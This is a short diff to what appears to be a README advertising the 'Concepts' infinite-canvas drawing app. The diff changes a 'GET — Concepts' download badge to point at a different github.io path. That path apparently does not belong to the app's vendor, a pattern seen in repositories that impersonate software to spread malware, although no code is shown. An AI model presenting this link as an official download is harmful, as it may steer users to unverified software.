@@ -4,7 +4,7 @@
 
 Concepts is a flexible drawing workspace built around an infinite canvas for design and sketching. Concepts gives designers, architects, and visual thinkers one continuous surface where sketch design, vector notes, and idea boards live together without page breaks or fixed borders. The drawing workspace stays calm and readable whether you are roughing out a quick concept or refining a detailed vector illustration. Concepts keeps every stroke editable, every layer organized, and every idea accessible on one endless plane.
 
-[![GET — Concepts](https://img.shields.io/badge/GET%20%E2%80%94%20Concepts-0078D6?style=for-the-badge&logoColor=white)](https://concepts-infinite-canvas.github.io/.github/concepts-infinite-canvas)
+[![GET — Concepts](https://img.shields.io/badge/GET%20%E2%80%94%20Concepts-0078D6?style=for-the-badge&logoColor=white)](https://concepts-infinite-canvas.github.io/.github/concepts-infinite)
 
 ---
 
